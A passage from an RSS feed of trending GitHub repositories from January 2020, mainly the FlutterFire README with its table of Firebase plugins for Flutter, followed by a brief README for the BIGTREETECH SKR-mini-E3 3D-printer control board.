&lt;p&gt;Thanks to our many contributors and to &lt;a href="https://www.netlify.com/" rel="nofollow"&gt;Netlify&lt;/a&gt; for hosting &lt;a href="https://gatsbyjs.org" rel="nofollow"&gt;gatsbyjs.org&lt;/a&gt; and our example sites.&lt;/p&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>gatsbyjs</author><guid isPermaLink="false">https://github.com/gatsbyjs/gatsby</guid><pubDate>Sun, 19 Jan 2020 00:23:00 GMT</pubDate></item><item><title>FirebaseExtended/flutterfire #24 in All Languages, Today</title><link>https://github.com/FirebaseExtended/flutterfire</link><description>&lt;p&gt;&lt;i&gt;🔥 Firebase plugins for Flutter apps&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;h1&gt;&lt;a id="user-content-flutterfire" class="anchor" aria-hidden="true" href="#flutterfire"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;FlutterFire&lt;/h1&gt;
&lt;p&gt;&lt;a href="https://cirrus-ci.com/github/FirebaseExtended/flutterfire/master" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/75a13bc76ecad060e1b1209dbcde2673ed60cd89/68747470733a2f2f6170692e6369727275732d63692e636f6d2f6769746875622f4669726562617365457874656e6465642f666c7574746572666972652e737667" alt="Build Status" data-canonical-src="https://api.cirrus-ci.com/github/FirebaseExtended/flutterfire.svg" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;FlutterFire is a set of &lt;a href="https://flutter.io/platform-plugins/" rel="nofollow"&gt;Flutter plugins&lt;/a&gt;
that enable Flutter apps to use &lt;a href="https://firebase.google.com/" rel="nofollow"&gt;Firebase&lt;/a&gt; services. You can follow an example that shows how to use these plugins in the &lt;a href="https://codelabs.developers.google.com/codelabs/flutter-firebase/index.html#0" rel="nofollow"&gt;Firebase for Flutter&lt;/a&gt; codelab.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://flutter.dev" rel="nofollow"&gt;Flutter&lt;/a&gt; is Google’s UI toolkit for building beautiful, natively compiled applications for mobile, web, and desktop from a single codebase. Flutter is used by developers and organizations around the world, and is free and open source.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Note&lt;/em&gt;: FlutterFire is still under development, and some APIs and platforms might not be available yet.
&lt;a href="https://github.com/FirebaseExtended/flutterfire/issues"&gt;Feedback&lt;/a&gt; and &lt;a href="https://github.com/FirebaseExtended/flutterfire/pulls"&gt;Pull Requests&lt;/a&gt; are most welcome!&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-available-flutterfire-plugins" class="anchor" aria-hidden="true" href="#available-flutterfire-plugins"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Available FlutterFire plugins&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Plugin&lt;/th&gt;
&lt;th&gt;Version&lt;/th&gt;
&lt;th&gt;Firebase feature&lt;/th&gt;
&lt;th&gt;Source code&lt;/th&gt;
&lt;th&gt;Web?&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href="https://pub.dartlang.org/packages/cloud_firestore" rel="nofollow"&gt;cloud_firestore&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/ae7ecb40a4f32956f5232f472d647c1fb2ce92bf/68747470733a2f2f696d672e736869656c64732e696f2f7075622f762f636c6f75645f6669726573746f72652e737667"&gt;&lt;img src="https://camo.githubusercontent.com/ae7ecb40a4f32956f5232f472d647c1fb2ce92bf/68747470733a2f2f696d672e736869656c64732e696f2f7075622f762f636c6f75645f6669726573746f72652e737667" alt="pub package" data-canonical-src="https://img.shields.io/pub/v/cloud_firestore.svg" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href="https://firebase.google.com/products/firestore/" rel="nofollow"&gt;Cloud Firestore&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href="https://github.com/FirebaseExtended/flutterfire/tree/master/packages/cloud_firestore"&gt;&lt;code&gt;cloud_firestore&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href="https://pub.dartlang.org/packages/cloud_functions" rel="nofollow"&gt;cloud_functions&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/c4e3abe0d1921466f39f3d5473099f85ed7c58d3/68747470733a2f2f696d672e736869656c64732e696f2f7075622f762f636c6f75645f66756e6374696f6e732e737667"&gt;&lt;img src="https://camo.githubusercontent.com/c4e3abe0d1921466f39f3d5473099f85ed7c58d3/68747470733a2f2f696d672e736869656c64732e696f2f7075622f762f636c6f75645f66756e6374696f6e732e737667" alt="pub package" data-canonical-src="https://img.shields.io/pub/v/cloud_functions.svg" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href="https://firebase.google.com/products/functions/" rel="nofollow"&gt;Cloud Functions&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href="https://github.com/FirebaseExtended/flutterfire/tree/master/packages/cloud_functions"&gt;&lt;code&gt;cloud_functions&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href="https://pub.dartlang.org/packages/firebase_admob" rel="nofollow"&gt;firebase_admob&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/1ab00530b4122de7f0b2a6e0f881a1a1974cde31/68747470733a2f2f696d672e736869656c64732e696f2f7075622f762f66697265626173655f61646d6f622e737667"&gt;&lt;img src="https://camo.githubusercontent.com/1ab00530b4122de7f0b2a6e0f881a1a1974cde31/68747470733a2f2f696d672e736869656c64732e696f2f7075622f762f66697265626173655f61646d6f622e737667" alt="pub package" data-canonical-src="https://img.shields.io/pub/v/firebase_admob.svg" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href="https://firebase.google.com/docs/admob/" rel="nofollow"&gt;Firebase AdMob&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href="https://github.com/FirebaseExtended/flutterfire/tree/master/packages/firebase_admob"&gt;&lt;code&gt;firebase_admob&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href="https://pub.dartlang.org/packages/firebase_analytics" rel="nofollow"&gt;firebase_analytics&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/91c10c78538f7a6a326028fa9677f7e31a629591/68747470733a2f2f696d672e736869656c64732e696f2f7075622f762f66697265626173655f616e616c79746963732e737667"&gt;&lt;img src="https://camo.githubusercontent.com/91c10c78538f7a6a326028fa9677f7e31a629591/68747470733a2f2f696d672e736869656c64732e696f2f7075622f762f66697265626173655f616e616c79746963732e737667" alt="pub package" data-canonical-src="https://img.shields.io/pub/v/firebase_analytics.svg" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href="https://firebase.google.com/products/analytics/" rel="nofollow"&gt;Firebase Analytics&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href="https://github.com/FirebaseExtended/flutterfire/tree/master/packages/firebase_analytics"&gt;&lt;code&gt;firebase_analytics&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href="https://pub.dartlang.org/packages/firebase_auth" rel="nofollow"&gt;firebase_auth&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/1512b07692a8310134994ffdad5d4821afe1fd9e/68747470733a2f2f696d672e736869656c64732e696f2f7075622f762f66697265626173655f617574682e737667"&gt;&lt;img src="https://camo.githubusercontent.com/1512b07692a8310134994ffdad5d4821afe1fd9e/68747470733a2f2f696d672e736869656c64732e696f2f7075622f762f66697265626173655f617574682e737667" alt="pub package" data-canonical-src="https://img.shields.io/pub/v/firebase_auth.svg" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href="https://firebase.google.com/products/auth/" rel="nofollow"&gt;Firebase Authentication&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href="https://github.com/FirebaseExtended/flutterfire/tree/master/packages/firebase_auth"&gt;&lt;code&gt;firebase_auth&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/394889/70172910-9174c880-1686-11ea-8e2e-3d8c1cc78cce.png"&gt;&lt;img src="https://user-images.githubusercontent.com/394889/70172910-9174c880-1686-11ea-8e2e-3d8c1cc78cce.png" alt="hummingbird" width="25" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href="https://pub.dartlang.org/packages/firebase_core" rel="nofollow"&gt;firebase_core&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/758670576123b393aa40818f2c95d13872524a74/68747470733a2f2f696d672e736869656c64732e696f2f7075622f762f66697265626173655f636f72652e737667"&gt;&lt;img src="https://camo.githubusercontent.com/758670576123b393aa40818f2c95d13872524a74/68747470733a2f2f696d672e736869656c64732e696f2f7075622f762f66697265626173655f636f72652e737667" alt="pub package" data-canonical-src="https://img.shields.io/pub/v/firebase_core.svg" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href="https://firebase.google.com/" rel="nofollow"&gt;Firebase Core&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href="https://github.com/FirebaseExtended/flutterfire/tree/master/packages/firebase_core"&gt;&lt;code&gt;firebase_core&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/394889/70172910-9174c880-1686-11ea-8e2e-3d8c1cc78cce.png"&gt;&lt;img src="https://user-images.githubusercontent.com/394889/70172910-9174c880-1686-11ea-8e2e-3d8c1cc78cce.png" alt="hummingbird" width="25" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href="https://pub.dartlang.org/packages/firebase_crashlytics" rel="nofollow"&gt;firebase_crashlytics&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/cfc171beaf4a36874a402ee8f762a57fdace6ad4/68747470733a2f2f696d672e736869656c64732e696f2f7075622f762f66697265626173655f63726173686c79746963732e737667"&gt;&lt;img src="https://camo.githubusercontent.com/cfc171beaf4a36874a402ee8f762a57fdace6ad4/68747470733a2f2f696d672e736869656c64732e696f2f7075622f762f66697265626173655f63726173686c79746963732e737667" alt="pub package" data-canonical-src="https://img.shields.io/pub/v/firebase_crashlytics.svg" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href="https://firebase.google.com/products/crashlytics/" rel="nofollow"&gt;Firebase Crashlytics&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href="https://github.com/FirebaseExtended/flutterfire/tree/master/packages/firebase_crashlytics"&gt;&lt;code&gt;firebase_crashlytics&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href="https://pub.dartlang.org/packages/firebase_database" rel="nofollow"&gt;firebase_database&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/3fc8f2617573cce6018cde23a949ce10dd87d211/68747470733a2f2f696d672e736869656c64732e696f2f7075622f762f66697265626173655f64617461626173652e737667"&gt;&lt;img src="https://camo.githubusercontent.com/3fc8f2617573cce6018cde23a949ce10dd87d211/68747470733a2f2f696d672e736869656c64732e696f2f7075622f762f66697265626173655f64617461626173652e737667" alt="pub package" data-canonical-src="https://img.shields.io/pub/v/firebase_database.svg" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href="https://firebase.google.com/products/database/" rel="nofollow"&gt;Firebase Realtime Database&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href="https://github.com/FirebaseExtended/flutterfire/tree/master/packages/firebase_database"&gt;&lt;code&gt;firebase_database&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href="https://pub.dartlang.org/packages/firebase_dynamic_links" rel="nofollow"&gt;firebase_dynamic_links&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/a6ccf1139e2f35e47645f1f456a1a948afd90e28/68747470733a2f2f696d672e736869656c64732e696f2f7075622f762f66697265626173655f64796e616d69635f6c696e6b732e737667"&gt;&lt;img src="https://camo.githubusercontent.com/a6ccf1139e2f35e47645f1f456a1a948afd90e28/68747470733a2f2f696d672e736869656c64732e696f2f7075622f762f66697265626173655f64796e616d69635f6c696e6b732e737667" alt="pub package" data-canonical-src="https://img.shields.io/pub/v/firebase_dynamic_links.svg" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href="https://firebase.google.com/products/dynamic-links/" rel="nofollow"&gt;Firebase Dynamic Links&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href="https://github.com/FirebaseExtended/flutterfire/tree/master/packages/firebase_dynamic_links"&gt;&lt;code&gt;firebase_dynamic_links&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href="https://pub.dartlang.org/packages/firebase_in_app_messaging" rel="nofollow"&gt;firebase_in_app_messaging&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/4fd66c985cc41740a8908b77e893f2f0b5a39f16/68747470733a2f2f696d672e736869656c64732e696f2f7075622f762f66697265626173655f696e5f6170705f6d6573736167696e672e737667"&gt;&lt;img src="https://camo.githubusercontent.com/4fd66c985cc41740a8908b77e893f2f0b5a39f16/68747470733a2f2f696d672e736869656c64732e696f2f7075622f762f66697265626173655f696e5f6170705f6d6573736167696e672e737667" alt="pub package" data-canonical-src="https://img.shields.io/pub/v/firebase_in_app_messaging.svg" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href="https://firebase.google.com/products/in-app-messaging/" rel="nofollow"&gt;Firebase In-App Messaging&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href="https://github.com/FirebaseExtended/flutterfire/tree/master/packages/firebase_in_app_messaging"&gt;&lt;code&gt;firebase_in_app_messaging&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href="https://pub.dartlang.org/packages/firebase_messaging" rel="nofollow"&gt;firebase_messaging&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/8f4099e896c695794d7ed0e6017971cfaed40950/68747470733a2f2f696d672e736869656c64732e696f2f7075622f762f66697265626173655f6d6573736167696e672e737667"&gt;&lt;img src="https://camo.githubusercontent.com/8f4099e896c695794d7ed0e6017971cfaed40950/68747470733a2f2f696d672e736869656c64732e696f2f7075622f762f66697265626173655f6d6573736167696e672e737667" alt="pub package" data-canonical-src="https://img.shields.io/pub/v/firebase_messaging.svg" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href="https://firebase.google.com/products/cloud-messaging/" rel="nofollow"&gt;Firebase Cloud Messaging&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href="https://github.com/FirebaseExtended/flutterfire/tree/master/packages/firebase_messaging"&gt;&lt;code&gt;firebase_messaging&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href="https://pub.dartlang.org/packages/firebase_ml_vision" rel="nofollow"&gt;firebase_ml_vision&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/c00c99fe0be6fc4860629b2700a65579899614be/68747470733a2f2f696d672e736869656c64732e696f2f7075622f762f66697265626173655f6d6c5f766973696f6e2e737667"&gt;&lt;img src="https://camo.githubusercontent.com/c00c99fe0be6fc4860629b2700a65579899614be/68747470733a2f2f696d672e736869656c64732e696f2f7075622f762f66697265626173655f6d6c5f766973696f6e2e737667" alt="pub package" data-canonical-src="https://img.shields.io/pub/v/firebase_ml_vision.svg" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href="https://firebase.google.com/products/ml-kit/" rel="nofollow"&gt;Firebase ML Kit&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href="https://github.com/FirebaseExtended/flutterfire/tree/master/packages/firebase_ml_vision"&gt;&lt;code&gt;firebase_ml_vision&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href="https://pub.dartlang.org/packages/firebase_performance" rel="nofollow"&gt;firebase_performance&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/3d7e7ad551acff7c6df0afeaf8399bf8a1bc150f/68747470733a2f2f696d672e736869656c64732e696f2f7075622f762f66697265626173655f706572666f726d616e63652e737667"&gt;&lt;img src="https://camo.githubusercontent.com/3d7e7ad551acff7c6df0afeaf8399bf8a1bc150f/68747470733a2f2f696d672e736869656c64732e696f2f7075622f762f66697265626173655f706572666f726d616e63652e737667" alt="pub package" data-canonical-src="https://img.shields.io/pub/v/firebase_performance.svg" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href="https://firebase.google.com/products/performance/" rel="nofollow"&gt;Firebase Performance Monitoring&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href="https://github.com/FirebaseExtended/flutterfire/tree/master/packages/firebase_performance"&gt;&lt;code&gt;firebase_performance&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href="https://pub.dartlang.org/packages/firebase_remote_config" rel="nofollow"&gt;firebase_remote_config&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/54ac57d4e77aa1bdcd17fc3cfbfada87097719a8/68747470733a2f2f696d672e736869656c64732e696f2f7075622f762f66697265626173655f72656d6f74655f636f6e6669672e737667"&gt;&lt;img src="https://camo.githubusercontent.com/54ac57d4e77aa1bdcd17fc3cfbfada87097719a8/68747470733a2f2f696d672e736869656c64732e696f2f7075622f762f66697265626173655f72656d6f74655f636f6e6669672e737667" alt="pub package" data-canonical-src="https://img.shields.io/pub/v/firebase_remote_config.svg" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href="https://firebase.google.com/products/remote-config/" rel="nofollow"&gt;Firebase Remote Config&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href="https://github.com/FirebaseExtended/flutterfire/tree/master/packages/firebase_remote_config"&gt;&lt;code&gt;firebase_remote_config&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href="https://pub.dartlang.org/packages/firebase_storage" rel="nofollow"&gt;firebase_storage&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/b1df3f4778a8b8988819744645ecb7a71eb846dc/68747470733a2f2f696d672e736869656c64732e696f2f7075622f762f66697265626173655f73746f726167652e737667"&gt;&lt;img src="https://camo.githubusercontent.com/b1df3f4778a8b8988819744645ecb7a71eb846dc/68747470733a2f2f696d672e736869656c64732e696f2f7075622f762f66697265626173655f73746f726167652e737667" alt="pub package" data-canonical-src="https://img.shields.io/pub/v/firebase_storage.svg" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href="https://firebase.google.com/products/storage/" rel="nofollow"&gt;Firebase Cloud Storage&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href="https://github.com/FirebaseExtended/flutterfire/tree/master/packages/firebase_storage"&gt;&lt;code&gt;firebase_storage&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2&gt;&lt;a id="user-content-issues" class="anchor" aria-hidden="true" href="#issues"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Issues&lt;/h2&gt;
&lt;p&gt;Please file FlutterFire specific issues, bugs, or feature requests in our &lt;a href="https://github.com/FirebaseExtended/flutterfire/issues/new"&gt;issue tracker&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Plugin issues that are not specific to FlutterFire can be filed in the &lt;a href="https://github.com/flutter/flutter/issues/new"&gt;Flutter issue tracker&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-contributing" class="anchor" aria-hidden="true" href="#contributing"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Contributing&lt;/h2&gt;
&lt;p&gt;If you wish to contribute a change to any of the existing plugins in this repo,
please review our &lt;a href="https://github.com/FirebaseExtended/flutterfire/blob/master/CONTRIBUTING.md"&gt;contribution guide&lt;/a&gt;,
and send a &lt;a href="https://github.com/FirebaseExtended/flutterfire/pulls"&gt;pull request&lt;/a&gt;.&lt;/p&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>FirebaseExtended</author><guid isPermaLink="false">https://github.com/FirebaseExtended/flutterfire</guid><pubDate>Sun, 19 Jan 2020 00:24:00 GMT</pubDate></item><item><title>bigtreetech/BIGTREETECH-SKR-mini-E3 #25 in All Languages, Today</title><link>https://github.com/bigtreetech/BIGTREETECH-SKR-mini-E3</link><description>&lt;p&gt;&lt;i&gt;BIGTREETECH SKR-mini-E3 motherboard is a ultra-quiet, low-power, high-quality 3D printing machine control board. It is launched by the 3D printing team of Shenzhen BIGTREE technology co., LTD. This board is specially tailored for Ender 3 printer, perfectly replacing the original Ender3 printer motherboard.&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;h1&gt;&lt;a id="user-content-bigtreetech-skr-mini-e3" class="anchor" aria-hidden="true" href="#bigtreetech-skr-mini-e3"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;BIGTREETECH-SKR-mini-E3&lt;/h1&gt;
&lt;p&gt;BIGTREETECH SKR-mini-E3 motherboard is a ultra-quiet, low-power, high-quality 3D printing machine control board. It is launched by the 3D printing team of Shenzhen BIGTREE technology co., LTD. This board is specially tailored for Ender 3 printer, perfectly replacing the original Ender3 printer motherboard.&lt;/p&gt;
&lt;p&gt;Note: If your motherbord version is BIGTREETECH-SKR-mini-E3 V1.0, please check the BIGTREETECH-SKR-mini-E3 V1.0 document which is in the firmware and hardware files.
If your motherbord version is BTT SKR mini E3 V1.2, please check the BTT SKR mini E3 V1.2 document which is in the firmware and hardware files.
The refer to check the main differences of the BTT SKR mini E3 V1.2：
&lt;a href="https://github.com/bigtreetech/BIGTREETECH-SKR-mini-E3/blob/master/hardware/BTT%20SKR%20MINI%20E3%20V1.2/The%20Notement%20of%20BTT%20SKR%20MINI%20E3%20V1.2.pdf"&gt;The notement of BTT SKR MINI E3 V1.2&lt;/a&gt;&lt;/p&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>bigtreetech</author><guid isPermaLink="false">https://github.com/bigtreetech/BIGTREETECH-SKR-mini-E3</guid><pubDate>Sun, 19 Jan 2020 00:25:00 GMT</pubDate></item></channel></rss>